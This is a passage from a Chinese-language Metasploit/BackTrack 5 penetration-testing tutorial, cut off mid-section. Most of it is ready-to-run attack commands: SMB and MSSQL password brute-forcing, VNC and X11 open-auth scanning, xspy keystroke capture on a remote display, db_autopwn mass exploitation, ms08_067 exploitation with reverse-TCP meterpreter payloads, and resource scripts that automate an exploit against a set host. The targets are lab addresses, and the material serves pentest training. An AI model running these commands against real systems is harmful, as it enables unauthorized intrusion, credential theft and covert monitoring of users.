viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>  2：题外：ncat还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l --chat   其他客户端：ncat chatserver</p><p>  3：ncat还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：
服务器（server.example.com）上：<code>ncat -l --keep-open 80 --output caidao.log &gt; /dev/null</code>  然后使用菜刀连接<a href="http://server.example.com/nc.php" target="_blank" rel="noopener noreferrer">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，--output换为--hex-dump就可以了。</p><p>  4：其实与nc功能类似的工具在bt5里面还有很多，比如还有一个sbd：</p><p>监听：<code>sbd -l -p 12345</code></p><p>连接：<code>sbd 192.168.1.111 12345</code></p><p>  5：当然也可以用来聊天，与ncat的不同之处在于ncat自动对用户编号user1、user2、...，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：</p><p>pc1：<code>sbd -l -p 12345 -P chowner</code></p><p>pc2：<code>sbd pc1 12345 -P evil</code></p><p>  6：其实nc也可以用来聊天的：</p><p>pc1：<code>nc -l -p 12345</code></p><p>pc2: <code>telnet pc1 12345</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-与nexpose结合扫描">2 与NeXpose结合扫描：<a class="hash-link" href="#2-与nexpose结合扫描" title="标题的直接链接">​</a></h3><p>在nexpose中扫描目标并生成xml格式的报告后，将报告导入到msf：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/host_test.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svvs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在MSF中运行nexpose：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_destroy postgres:toor@127.0.0.l1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nexpose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect –h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect nexpose:toor@192.168.1.111 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_scan 192.168.1.195</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（如果你想在bt5里安装nexpose的话建议把bt5硬盘空间多留几十G，这玩意硬盘小了不让装。）</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3与nessus结合扫描">3、与nessus结合扫描：<a class="hash-link" href="#3与nessus结合扫描" title="标题的直接链接">​</a></h3><p>使用Nessus扫描完成后生成.nessus格式的报告，导入到MSF：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/nessus_report_Host_test.nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在MSF中使用Nessus：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_connect nessus:toor@192.168.1.111:8834 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_policy_list  #查看存在的扫描规则</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_new 2 bridge_scan 192.168.1.111 #2表示规则的ID号，bridge_scan自定义扫描名称</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_status #查看扫描进行状态</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_list  #查看扫描结果</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_get skjla243-3b5d-*******   #导入报告</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4特殊扫描">4、特殊扫描：<a class="hash-link" href="#4特殊扫描" title="标题的直接链接">​</a></h3><p>SMB弱口令:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111-222</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBUser Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>VNC空口令：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Open X11空口令：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/x11/open_x11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/sniffers/xspy/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./xspy –display 192.168.1.125:0 –delay 100</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5使用autopwn处理扫描结果">5、使用Autopwn处理扫描结果：<a class="hash-link" href="#5使用autopwn处理扫描结果" title="标题的直接链接">​</a></h3><p>autopwn选项：e执行attack   t查看匹配模块   r使用reverse shell作为payload   x基于漏洞筛选模块  p基于端口筛选模块</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /root/nessus.nbe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_autopwn –e –t –r –x –p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>-e 针对符合条件的目标加载所有exploit -t显示所有匹配的exploit -r使用反弹shell</li><li>-x 基于漏洞筛选模块 -p基于端口筛选模块</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="五基础溢出命令">五．基础溢出命令<a class="hash-link" href="#五基础溢出命令" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1基本命令">1、基本命令：<a class="hash-link" href="#1基本命令" title="标题的直接链接">​</a></h3><p>查看可用溢出模块<code>show exploits</code>
查看辅助模块<code>show auxiliary</code>  包括扫描器，拒绝服务模块，fuzzer工具或其他。
查看可用选项<code>show options</code></p><p>加载模块后退出此模块 back</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">back</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>搜索模块 search</p><p>例子： <code>searh mssql search ms08_067</code></p><p>查看当前模块可用的payload： <code>show payloads</code></p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查看可选的目标类型<code>show targets</code>
查看更多信息<code>info</code>
设置一个选项或取消设置 <code>set/unset</code>
设置或取消全局选项 <code>setg/unsetg</code>  例如设置LHOST就可以用setg，避免后面重复设置
保存全局选项的设置 <code>save</code>   当下次启动仍然生效
查看建立的session  <code>sessions –l</code></p><p>激活session   <code>sessions –i  num</code>    #num为session编号</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2暴力端口探测">2、暴力端口探测：<a class="hash-link" href="#2暴力端口探测" title="标题的直接链接">​</a></h3><p>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.122</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search ports   #搜索与ports相关模块</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp_allports</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j   #作为后台任务运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –l –v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sesssions –i 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf脚本文件">3、MSF脚本文件：<a class="hash-link" href="#3msf脚本文件" title="标题的直接链接">​</a></h3><p>为了缩短测试时间可以将msf命令写入一个文件，然后在msf中加载它。</p><p>加载方式：msfconsole的resource命令或者msfconsole加上-r选项</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘version’ &gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘load sounds’ &gt;&gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole –r resource.rc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;use exploit/windows/smb/ms08_067_netapi&#x27; &gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set RHOST 192.168.1.133&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set PAYLOAD windows/meterpreter/reverse_tcp&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set LHOST 192.168.1.111&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;exploit&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource autoexp.rc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="六meterpreter">六．METERPRETER<a class="hash-link" href="#六meterpreter" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用meterpreter">1、使用meterpreter<a class="hash-link" href="#1使用meterpreter" title="标题的直接链接">​</a></h3><p>当对目标系统进行溢出时，使用meterpreter作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。
例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sT –A –P0 192.168.1.130 #探测开放服务</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#假如已经探测到1433（TCP）和1434(UDP)端口（mssql），</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.1/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此可获取服务器名称，版本号等信息。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell功能添加账户：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/windows/mssql/mssql_payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 433</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD password130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>当获取到一个meterpreter shell 后可以执行更多的操作：</p><p>获取屏幕截图：<code>screenshot</code></p><p>获取系统信息：<code>sysinfo</code></p><p>获取键盘记录：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div 